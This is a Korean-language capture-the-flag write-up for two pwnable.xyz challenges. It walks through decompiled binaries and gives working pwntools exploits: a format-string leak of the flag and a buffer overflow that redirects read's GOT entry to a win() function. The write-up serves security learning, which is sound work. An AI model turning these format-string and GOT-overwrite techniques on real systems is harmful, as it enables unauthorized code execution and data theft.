# pwnable.xyz
## Grownup
~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *src; // ST08_8
  __int64 buf; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setup();
  buf = 0LL;
  v6 = 0LL;
  printf("Are you 18 years or older? [y/N]: ", argv);
  *((_BYTE *)&buf + (signed int)((unsigned __int64)read(0, &buf, 0x10uLL) - 1)) = 0;
  if ( (_BYTE)buf != 'y' && (_BYTE)buf != 'Y' )
    return 0;
  src = (char *)malloc(0x84uLL);
  printf("Name: ", &buf);
  read(0, src, 0x80uLL);
  strcpy(usr, src);
  printf("Welcome ", src);
  printf(qword_601160, usr);
  return 0;
}
~~~
ida를 통해 본 코드는 위와 같다. 첫입력에서 y나 Y를 입력하지 않을 경우 프로그램이 멈춘다.
read를 한 것을 strcpy로 옮기는 것이 수상해서 검색해봤다. read는 null을 끝에 붙이지 않는데 strcpy는 null을 끝에 붙여준다.
좀 더 알아보니 포맷스트링 공격이 가능하다고 한다. 위 코드 경우 끝에 0x81에 null 값이 들어가서 포맷스트링 공격이 가능한 것이다.
data 부분을 조금 더 찾았더니 0x601080 주소에 flag가 있는 것을 확인했다. 내가 이해한 것은 0x80만큼 name부분에 집어넣어 포맷스트링을 
손상시키는 것이었는데 잘 안 되었다. 알고보니 처음에 y를 입력할 때 flag의 주소값을 입력해야 하는 거였다.
~~~python
from pwn import *
r=remote("svc.pwnable.xyz",30004)
flag=0x601080
pay=''
pay+='Y'+'A'*7+p32(flag)
r.recvuntil("[y/N]: ")
r.sendline(pay)
formatstr='%p%p%p%p%p%p%p%p%s%p%p%p'
pay=''
pay+='A'*60+formatstr+'A'*(0x80-len(formatstr)-32)
r.recvuntil("Name: ")
r.sendline(pay)
print r.recvall()
~~~
writeup을 참고하여 짜게 된 exploitcode이다. 우선 18살 이상이냐고 물을 때 y와 dummy(7) 그리고 flag 주소를 little endian으로 넣어줬다.
다음 formatstr을 통해 몇번째에 flag가 나타나는지 확인하고 그 부분을 %s로 바꾸어 flag를 확인했다.
## note
~~~c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdi
  int v4; // eax

  setup(*(_QWORD *)&argc, argv, envp);
  v3 = "Note taking 101.";
  puts("Note taking 101.");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        print_menu(v3);
        v4 = read_int32();
        if ( v4 != 1 )
          break;
        edit_note();
      }
      if ( v4 != 2 )
        break;
      edit_desc();
    }
    if ( !v4 )
      break;
    v3 = "Invalid";
    puts("Invalid");
  }
  return 0;
}
~~~
코드는 위와 같았고 ida 옆에 win이라는 함수가 있길래 들어갔더니
~~~c
int win()
{
  return system("cat flag");
}
~~~
system 함수로 flag 값을 보여주는 것을 알 수 있었다. 이 함수의 주소를 사용하면 될 듯하다. buf에 값을 주는
함수를 찾았더니 edit_note와 edit_desc가 있었다. 이때 edit_note에서 정보를 받는 s의 32비트 밑에 buf가 있다.
~~~
.bss:0000000000601480 ; char s[32]
.bss:0000000000601480 s               db 20h dup(?)           ; DATA XREF: edit_note+67↑o
.bss:00000000006014A0 ; void *buf
.bss:00000000006014A0 buf             dq ?                    ; DATA XREF: edit_desc+4↑r
.bss:00000000006014A0                                         ; edit_desc+1A↑w ...
.bss:00000000006014A0 _bss            ends
~~~
그러니까 read 함수의 got를 구한 뒤 edit_note에 32비트의 dummy와 함께 got를 넣어 buf를 바꾸어놓은 후
다시 edit_note를 통해 win함수의 주소를 넣어 flag를 확인하면 된다.
~~~
.got.plt:0000000000601248 off_601248      dq offset read          ; DATA XREF: _read↑r
~~~
read()의 주소이다. 그리고 win함수의 주소는 0x40093c이다.
아래는 exploit code이다.
~~~python
from pwn import *

r = remote("svc.pwnable.xyz", 30016)

r.sendafter("> ","1")

r.sendafter("len? ","100")

r.sendafter("note: ","A"*32 + p64(0x601248))

r.sendafter("> ","2")

r.sendafter("desc: ",p64(0x40093c))

r.sendafter("> ","2")

print r.recvall()
~~~


